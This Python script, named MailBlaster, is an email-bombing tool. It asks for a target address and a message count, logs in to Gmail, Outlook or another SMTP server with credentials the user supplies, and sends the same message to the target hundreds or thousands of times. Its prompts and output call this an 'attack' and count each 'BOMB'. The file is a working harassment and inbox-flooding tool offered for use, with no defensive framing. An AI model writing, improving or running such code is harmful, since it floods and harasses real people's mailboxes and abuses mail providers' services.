import smtplib
import sys

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

def banner():
    print(r"""
   __  __       _ _ ____  _           _             
  |  \/  |     (_) |  _ \| |         | |            
  | \  / | __ _ _| | |_) | | __ _ ___| |_ ___  _ __ 
  | |\/| |/ _` | | |  _ <| |/ _` / __| __/ _ \| '__|
  | |  | | (_| | | | |_) | | (_| \__ \ || (_) | |   
  |_|  |_|\__,_|_|_|____/|_|\__,_|___/\__\___/|_|   
                                                    
""")
    print(Colors.YELLOW + "Initializing MailBlaster..." + Colors.RESET)

class MailBlaster:
    count = 0

    def __init__(self):
        try:
            self.target = input(Colors.GREEN + "Email Address: ->" + Colors.RESET)
            print("Initializing MailBlaster..." + Colors.RESET)
            print(Colors.GREEN + "Email Mode 1: 1000 mails" + Colors.RESET)
            print(Colors.GREEN + "Email Mode 2: 500 mails" + Colors.RESET)
            print(Colors.GREEN + "Email Mode 3: 250 mails" + Colors.RESET)
            print(Colors.GREEN + "Email Mode 4: you choose" + Colors.RESET)
            self.mode = int(input(Colors.GREEN + "Email Mode (1-4): ->" + Colors.RESET))
            if self.mode > 4 or self.mode < 1:
                print(Colors.RED + "Invalid Email Mode" + Colors.RESET)
                sys.exit(1)
        except Exception as e:
            print(Colors.RED + f"Error: {e}" + Colors.RESET)

    def bomb(self):
        try:
            print(Colors.YELLOW + "Sending Email..." + Colors.RESET)
            self.amount = None
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            else:
                self.amount = int(input(Colors.GREEN + "Amount to send: ->" + Colors.RESET))
            print(Colors.YELLOW + "Sending Email Complete" + Colors.RESET)
        except Exception as e:
            print(Colors.RED + f"Error: {e}" + Colors.RESET)

    def email(self):
        try:
            print(Colors.GREEN + "Setting up email" + Colors.RESET)
            self.server = str(input('Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook -> '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input('Enter port number -> '))

            if default_port:
                self.port = 587

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.hotmail.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input('Enter from address -> '))
            self.fromPwd = str(input('Enter from password -> '))
            self.subject = str(input('Enter subject -> '))
            self.message = str(input('Enter message -> '))

            self.msg = f'''From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n{self.message}\n'''

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(Colors.RED + f'ERROR: {e}' + Colors.RESET)

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(Colors.GREEN + f'BOMB: {self.count}' + Colors.RESET)
        except Exception as e:
            print(Colors.RED + f'ERROR: {e}' + Colors.RESET)

    def attack(self):
        print(Colors.YELLOW + 'Attacking...' + Colors.RESET)
        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print(Colors.GREEN + 'Attack finished' + Colors.RESET)
        sys.exit(0)

if __name__ == '__main__':
    banner()
    bomb = MailBlaster()
    bomb.bomb()
    bomb.email()
    bomb.attack()
